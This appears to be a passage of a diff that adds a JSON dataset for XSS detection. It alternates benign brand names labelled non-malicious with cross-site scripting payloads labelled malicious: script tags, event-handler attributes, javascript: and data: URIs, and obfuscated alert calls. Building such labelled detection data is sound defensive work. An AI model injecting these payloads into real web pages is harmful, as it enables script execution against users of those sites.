+      "value":"Netflix",
+      "isMalicious":0
+   },
+   {
+      "value":"<a href=\"#\" onclick=\"window['alert']('XSS')\">Click me</a>",
+      "isMalicious":1
+   },
+   {
+      "value":"Spotify",
+      "isMalicious":0
+   },
+   {
+      "value":"<script src=\"data:text/javascript,alert('XSS')\"></script>",
+      "isMalicious":1
+   },
+   {
+      "value":"PlayStation",
+      "isMalicious":0
+   },
+   {
+      "value":"<svg><animate onbegin=alert('XSS') attributeName=x dur=1s>",
+      "isMalicious":1
+   },
+   {
+      "value":"Xbox",
+      "isMalicious":0
+   },
+   {
+      "value":"<select onfocus=alert('XSS') autofocus>",
+      "isMalicious":1
+   },
+   {
+      "value":"Nintendo",
+      "isMalicious":0
+   },
+   {
+      "value":"<blink onmouseover=alert('XSS')>hover me</blink>",
+      "isMalicious":1
+   },
+   {
+      "value":"Tesla",
+      "isMalicious":0
+   },
+   {
+      "value":"<b onmouseover=alert('XSS')>hover me</b>",
+      "isMalicious":1
+   },
+   {
+      "value":"Ford",
+      "isMalicious":0
+   },
+   {
+      "value":"<a href=\"javascript:void(0)\" onmouseover=alert('XSS')>hover me</a>",
+      "isMalicious":1
+   },
+   {
+      "value":"Toyota",
+      "isMalicious":0
+   },
+   {
+      "value":"<iframe src=\"javascript:alert('XSS');\"></iframe>",
+      "isMalicious":1
+   },
+   {
+      "value":"Honda",
+      "isMalicious":0
+   },
+   {
+      "value":"<img src=\"x\" onError=\"javascript:window.onerror=alert;throw 'XSS'\">",
+      "isMalicious":1
+   },
+   {
+      "value":"BMW",
+      "isMalicious":0
+   },
+   {
+      "value":"<audio src=\"x\" onerror=\"alert('XSS')\"></audio>",
+      "isMalicious":1
+   },
+   {
+      "value":"Mercedes",
+      "isMalicious":0
+   },
+   {
+      "value":"<video src=\"x\" onerror=\"alert('XSS')\"></video>",
+      "isMalicious":1
+   },
+   {
+      "value":"Audi",
+      "isMalicious":0
+   },
+   {
+      "value":"<svg><use href=\"data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' width='100' height='100'><a xlink:href='javascript:alert(1)'><rect x='0' y='0' width='100' height='100' /></a></svg>#x\"></use></svg>",
+      "isMalicious":1
+   },
+   {
+      "value":"Volkswagen",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>function x(){alert('XSS');}</script><script>x()</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"Porsche",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>window['alert']('XSS')</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"Ferrari",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>Object.defineProperty(window,'alert',{value:eval})('XSS')</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"Lamborghini",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>setTimeout('alert(\"XSS\")',0)</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"Bugatti",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>['alert'].forEach(alert=>{window[alert]('XSS')})</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"Rolls-Royce",
+      "isMalicious":0
+   },
+   {
+      "value":"<title onpropertychange=alert('XSS')></title><title title=1>test</title>",
+      "isMalicious":1
+   }
+]
